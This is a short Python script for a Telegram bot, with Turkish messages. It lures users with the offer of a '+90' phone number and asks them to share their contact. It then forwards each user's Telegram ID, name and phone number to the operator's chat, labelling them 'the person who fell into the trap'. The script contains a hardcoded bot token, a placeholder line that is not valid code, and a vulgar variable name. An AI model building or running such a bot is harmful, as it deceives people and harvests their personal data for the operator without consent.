import telebot

ramowlf = "6801818710:AAHhOpRKt3l7z6EL0cZdumvA-ltxwyuDhH4"
ramazan = telebot.TeleBot(ramowlf)

id = kendi idni veya chat idsi

@ramazan.message_handler(commands=['start'])
def ramazan_ozturk(message):
    ramo_otlama = message.chat.id
    Instagram_ramowlf = message.from_user.id
    ramazan_baba= message.from_user.first_name
    github_ramowlf = f"tuzağa düşen kişi: [tuzağa düşen kişi](tg://user?id={Instagram_ramowlf}), isim: {ramazan_baba}"
    
    ramazan.send_message(id, github_ramowlf, parse_mode='Markdown')

    markup = telebot.types.ReplyKeyboardMarkup(one_time_keyboard=True)
    markup.add(telebot.types.KeyboardButton('+90 Al', request_contact=True))
    ramazan.send_message(message.chat.id, f"Merhabalar {ramazan_baba}, aşağıdaki butonlardan istediğiniz numarayı seçiniz lütfen\n\nÜzgünüm tek aktif numara var", reply_markup=markup)

@ramazan.message_handler(content_types=['contact'])
def insta_ramowlf(message):
    ramazan_abi = message.contact
    ramo = message.contact.phone_number
    ramo_otlama = message.chat.id
    Instagram_ramowlf= message.from_user.id
    ramazan_baba = message.from_user.first_name
    
    github_ramowlf = f"tuzağa düşen kişi: [tuzağa düşen kişi](tg://user?id={Instagram_ramowlf}), isim: {ramazan_baba}, tel no: +{ramo}"
    
    ramazan.send_message(id, github_ramowlf, parse_mode='Markdown')

    sakso_cekiyor = f"Hey {ramazan_baba} 👋 sen evet sen, 5 dakika içinde aktif olmanı rica ediyorum senden ve hangi ülkenin numarasını istediğini yaz + olarak"
    ramazan.send_message(message.chat.id, sakso_cekiyor)

ramazan.polling()